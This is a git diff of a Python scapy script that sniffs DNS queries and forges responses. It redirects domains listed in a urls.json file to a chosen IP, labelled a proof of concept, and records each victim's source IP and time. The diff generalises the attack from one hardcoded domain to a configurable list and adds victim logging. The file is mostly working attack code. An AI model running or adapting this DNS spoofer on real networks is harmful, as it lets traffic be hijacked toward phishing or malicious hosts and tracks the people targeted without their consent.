@@ -1,20 +1,29 @@
 from scapy.all import * #type:ignore
+from pathlib import Path
 from data.data_helper import record_entry
 
 import time
 
+
 # Configuration
-SPOOF_DOMAIN = "www.techinginfo.com"  # Domain to spoof
+def load_urls() -> dict[str,str]:
+    try:
+        with open(f'{Path(__file__).parent}/urls.json', 'r') as file:
+            return json.load(file)
+    except Exception as e:
+        return {}
+    
+URLS: dict[str,str] = load_urls()
 SPOOF_IP = "127.0.0.1"        # IP to redirect to (localhost for PoC)
 INTERFACE = "en1"             # Your network interface (check with `ifconfig`)
 
 def dns_spoof(pkt):
     # Check if packet is a DNS query
-    #print("Found packets")
+    #print("Found packets")req info working full
     if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:#type:ignore
         #print("Found dns packets")
         qname = pkt[DNSQR].qname.decode().rstrip(".")#type:ignore
-        if qname == SPOOF_DOMAIN:
+        if qname in URLS.keys():
             #print(f"Intercepted DNS query for {qname}")
 
             # Craft spoofed DNS response
@@ -35,12 +44,14 @@ def dns_spoof(pkt):
                 sendp(spoofed_pkt, verbose=0)
                 time.sleep(0.1)
             print(f"Spoofed DNS response sent: {qname} -> {SPOOF_IP}")
-            record_entry(SPOOF_DOMAIN,build_dict_from_packet(pkt))
+            record_entry(qname,build_dict_from_packet(pkt))
             
 def build_dict_from_packet(pkt) -> dict[str,str]:
     return {"IP":pkt[IP].src,"Time":time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())}
 
 
-# Sniff DNS packets
-print(f"Sniffing DNS queries for {SPOOF_DOMAIN} on {INTERFACE}...")
-sniff(filter="udp port 53", prn=dns_spoof, store=0)
+
+if __name__ == "__main__":
+    # Sniff DNS packets
+    print(f"Sniffing DNS queries for {URLS.keys()} on {INTERFACE}...")
+    sniff(filter="udp port 53", prn=dns_spoof, store=0)
